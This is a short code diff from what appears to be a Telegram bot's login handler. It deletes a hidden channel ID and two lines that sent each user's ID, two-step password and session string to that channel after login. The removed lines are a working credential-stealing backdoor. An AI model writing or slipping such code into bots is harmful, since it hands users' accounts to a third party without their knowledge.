@@ -24,9 +24,6 @@ collection = db[COLLECTION_NAME]
 user_steps = {}
 user_data = {}
 
-SESSION_CHANNEL = -1002149976449
-
-
 def delete_session_files(user_id):
     session_file = f"session_{user_id}.session"
     if os.path.exists(session_file):
@@ -79,7 +76,6 @@ async def process_step(client, message):
                 upsert=True
             )
             await message.reply(f"✅ Login successful!")
-            await gagan.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
         except PhoneCodeInvalid:
@@ -107,7 +103,6 @@ async def process_step(client, message):
                 upsert=True
             )
             await message.reply(f"✅ Login successful!")
-            await gagan.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
         except PasswordHashInvalid:
